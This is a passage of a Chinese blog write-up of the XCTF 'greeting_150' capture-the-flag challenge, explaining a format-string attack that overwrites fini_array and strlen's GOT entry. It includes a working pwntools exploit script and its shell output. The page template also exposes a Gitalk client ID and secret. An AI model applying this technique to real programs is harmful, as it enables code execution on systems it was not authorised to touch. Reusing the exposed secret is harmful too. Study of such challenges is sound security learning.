+<p>发现0x080485A0 地址和start地址只有最后两字节不同所以要打印的字符串最少（%n），然后就是向strlen_got中覆盖system_plt。<br>如果直接把0x08048490一次全部覆盖那么要打印：128MB的大小</p>
+<pre class=" language-java"><code class="language-java">In <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x08048490</span>
+Out<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">134513808</span>
+
+In <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">134513808</span><span class="token operator">/</span><span class="token number">1024</span>
+Out<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">131361</span>
+
+In <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">131361</span><span class="token operator">/</span><span class="token number">1024</span>
+Out<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">128</span></code></pre>
+<blockquote>
+<p>如果我们所有的试验都是在本机/虚拟机和docker之间进行，不会受到网络环境的影响。而在实际的比赛和漏洞利用环境中，一次性传输如此大量的数据可能会导致网络卡顿甚至中断连接。所以不能这么暴力，所以说还是得精心构造~~，要使打印的数据尽量少。<br>所以我们覆盖那些覆盖量少的地址，这样就能有效减少打印数据量。<br>那么应该是先让把fini_array 里面的地址覆盖为start,两个字节（hn）.然后也分两个字节（hn）覆盖strlen_got里面的地址（strlen_addr）。注意这是小端序即高地址存放高字节数据，低地址存放低字节数据</p>
+</blockquote>
+<pre class=" language-java"><code class="language-java">举例：
+var <span class="token operator">=</span> <span class="token number">0x11223344</span>，对于这个变量的最高字节为<span class="token number">0x11</span>，最低字节为<span class="token function">0x44</span>
+<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>大端模式存储（存储地址为<span class="token number">16</span>位）
+地址                    数据
+<span class="token function">0x0004</span><span class="token punctuation">(</span>高地址<span class="token punctuation">)</span>     <span class="token number">0x44</span>
+<span class="token number">0x0003</span>                 <span class="token number">0x33</span>
+<span class="token number">0x0002</span>                 <span class="token number">0x22</span>
+<span class="token function">0x0001</span><span class="token punctuation">(</span>低地址<span class="token punctuation">)</span>     <span class="token function">0x11</span>
+
+<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>小端模式存储（存储地址为<span class="token number">16</span>位）
+地址                    数据
+<span class="token function">0x0004</span><span class="token punctuation">(</span>高地址<span class="token punctuation">)</span>     <span class="token number">0x11</span>
+<span class="token number">0x0003</span>                 <span class="token number">0x22</span>
+<span class="token number">0x0002</span>                 <span class="token number">0x33</span>
+<span class="token function">0x0001</span><span class="token punctuation">(</span>低地址<span class="token punctuation">)</span>     <span class="token number">0x44</span></code></pre>
+<p>差点忘了测偏移量了~~</p>
+<pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ <span class="token punctuation">.</span>/greeting 
+Hello<span class="token punctuation">,</span> I'm nao<span class="token operator">!</span>
+Please tell me your name<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> AABB<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p
+Nice to meet you<span class="token punctuation">,</span> AABB<span class="token punctuation">.</span><span class="token number">0x80487d0</span><span class="token punctuation">.</span><span class="token number">0xff91489c</span><span class="token punctuation">.</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0x6563694e</span><span class="token punctuation">.</span><span class="token number">0x206f7420</span><span class="token punctuation">.</span><span class="token number">0x7465656d</span><span class="token punctuation">.</span><span class="token number">0x756f7920</span><span class="token punctuation">.</span><span class="token number">0x4141202c</span><span class="token punctuation">.</span><span class="token number">0x252e4242</span><span class="token punctuation">.</span><span class="token number">0x70252e70</span><span class="token punctuation">.</span><span class="token number">0x2e70252e</span><span class="token punctuation">.</span><span class="token number">0x252e7025</span> <span class="token operator">:</span><span class="token punctuation">)</span></code></pre>
+<p>AA的ASCII的偏移为11，BB的ASCII的偏移为12，两者分开了，应该存入时栈没有对齐。<br>也可以在IDA伪码中算出偏移：<br>因为printf的s===&gt;esp+0x1c.   sprintf(&amp;s, “Nice to meet you, %s :)\n”, &amp;v5)；函数使得我们的输入（v5）距离s为18.所以0x1c-0x4+18==42  42/4 = 10.2这也是为啥上面AABB分开的原因，我们可以先用两个padding对齐，然后在存入关键数据。</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./greeting'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',41988)</span>
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+fini_array <span class="token operator">=</span> <span class="token number">0x08049934</span>
+system_plt <span class="token operator">=</span> <span class="token number">0x08048490</span>
+strlen_got <span class="token operator">=</span> <span class="token number">0x08049A54</span>
+start <span class="token operator">=</span>      <span class="token number">0x080484F0</span> 
+payload <span class="token operator">=</span> <span class="token string">'AA'</span>   <span class="token comment" spellcheck="true">#用来对齐的padding</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>strlen_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#12   //从低地址覆盖到高地址，两个字节。覆盖量：0x0804</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>strlen_got<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#13    //覆盖量：0x8490</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>fini_array<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#14  //覆盖量：0x84F0 </span>
+
+payload <span class="token operator">+=</span> <span class="token string">'%2020c%12$hn%31884c%13$hn%96c%14$hn'</span>    <span class="token comment" spellcheck="true">#用hn就是让printf函数向目标地址最多写满两个字节，还有别忘了前面的输出也算上</span>
+gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>                                      <span class="token comment" spellcheck="true">##补充，%hhn写1字节，%lln写8字节。</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>结果</p>
+<pre class=" language-java"><code class="language-java">Hello<span class="token punctuation">,</span> I'm nao<span class="token operator">!</span>
+Please tell me your name<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> $ <span class="token operator">/</span>bin<span class="token operator">/</span>sh
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x8</span> bytes<span class="token operator">:</span>
+    <span class="token string">'/bin/sh\n'</span>
+$ whoami
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>
+    <span class="token string">'whoami\n'</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>
+    <span class="token string">'hunter\n'</span>
+hunter
+$  </code></pre>
+<h2 id="MASS"><a href="#MASS" class="headerlink" title="MASS"></a>MASS</h2><p>为啥不用fmt漏洞覆盖plt表，而时偏要覆盖got表？<br>因为plt存放的时指令，got表才是存放地址。比如把plt这里的jmp数据给覆盖成目标地址，那也没法跳转啊</p>
+<pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>10i <span class="token number">0x80484c0</span>
+   <span class="token number">0x80484c0</span> <span class="token operator">&lt;</span>strlen<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    DWORD PTR ds<span class="token operator">:</span><span class="token number">0x8049a54</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>got表
+   <span class="token number">0x80484c6</span> <span class="token operator">&lt;</span>strlen<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x40</span>
+   <span class="token number">0x80484cb</span> <span class="token operator">&lt;</span>strlen<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token operator">:</span>    jmp    <span class="token number">0x8048430</span>
+
+第一次执行strlen以后，这里就是存放真实地址，而且有plt来帮忙跳转，把这里的地址覆盖了岂不美哉（doge）
+pwndbg<span class="token operator">></span> x<span class="token operator">/</span>10x <span class="token number">0x8049a54</span>
+<span class="token number">0x8049a54</span> <span class="token operator">&lt;</span>strlen<span class="token annotation punctuation">@got</span><span class="token punctuation">.</span>plt<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0xf7dea900</span>    <span class="token number">0xf7d7dd90</span>    <span class="token number">0x080484e6</span>    <span class="token number">0x00000000</span>
+<span class="token number">0x8049a64</span><span class="token operator">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span></code></pre>
+<p>在这个got表存放了system_plt后就会跳到system_plt去执行。应该换成system_got也没问题。</p>
+<p>参考资料：<a href="https://www.hacksec.cn/Penetration-test/1137.html" target="_blank" rel="noopener">https://www.hacksec.cn/Penetration-test/1137.html</a><br><a href="https://bbs.ichunqiu.com/thread-43624-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-43624-1-1.html</a></p>
+
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff;
+        background-color: #22AB38;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff;
+        background-color: #019FE8;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a class="reward-link btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs">
+                        <li class="tab wechat-tab waves-effect waves-light"><a class="active" href="#wechat">微信</a></li>
+                        <li class="tab alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                    </ul>
+                    <div id="wechat">
+                        <img src="/medias/reward/1.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                    <div id="alipay">
+                        <img src="/medias/reward/2.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('#reward .reward-link').on('click', function () {
+            $('#rewardModal').openModal();
+        });
+
+        $('#rewardModal .close').on('click', function () {
+            $('#rewardModal').closeModal();
+        });
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="http://squarepants0.github.io" class="b-link-green">Matrix</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2020/09/03/xctf-challenge-greeting-150/" class="b-link-green">XCTF-CHALLENGE-greeting_150</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'aa0bf75cc88de6c0258a',
+        clientSecret: '8ddc9bf71af314ac63d189a5ecb132fac7c0687d',
+        repo: 'Gitalks.github.io',
+        owner: 'squarepants0',
+        admin: "squarepants0",
+        id: '2020-09-03T12-36-04',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/09/03/xctf-challenge-greeting-150/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="XCTF-CHALLENGE-greeting_150">
+                        
+                        <span class="card-title">XCTF-CHALLENGE-greeting_150</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">昨天好不容易装上pwndbg，总是因为最后./setup时报错，说python3.6找不到命令，在网上找了很多教程都没用，最后把了解到pwndbg相当于一个加强版的gdb，然后我就把gdb删了就顺利装上了😭废话少说，回到题目~~
+chec</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-09-03
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CFT-PWN/" class="post-category" target="_blank">
+                                    CFT-PWN
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/xctf-pwn-challenge/" target="_blank">
+                        <span class="chip bg-color">xctf-pwn-challenge</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/08/30/xctf-challenge-recho/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="XCTF-CHALLENGE-Recho">
+                        
+                        <span class="card-title">XCTF-CHALLENGE-Recho</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">checksechunter@hunter:~/PWN/XCTF/xctf_challenge$ checksec Recho
+[*] '/home/hunter/PWN/XCTF/xctf_challenge/Recho'
+    Arc</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-08-30
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF-PWN/" class="post-category" target="_blank">
+                                    CTF-PWN
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/xctf-pwn-challenge/" target="_blank">
+                        <span class="chip bg-color">xctf-pwn-challenge</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('10')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Matrix<br />'
+            + '作者: IT YUAN<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者Matrix所有，任何形式的转载都请注明出处：https://squarepants0.github.io/。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">53.2k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:2337463603@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2334763603" target="_blank" rel="noopener" class="tooltipped" data-tooltip="QQ联系我: 2334763603" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input" autofocus="">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/js/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+
+</body>
+</html>
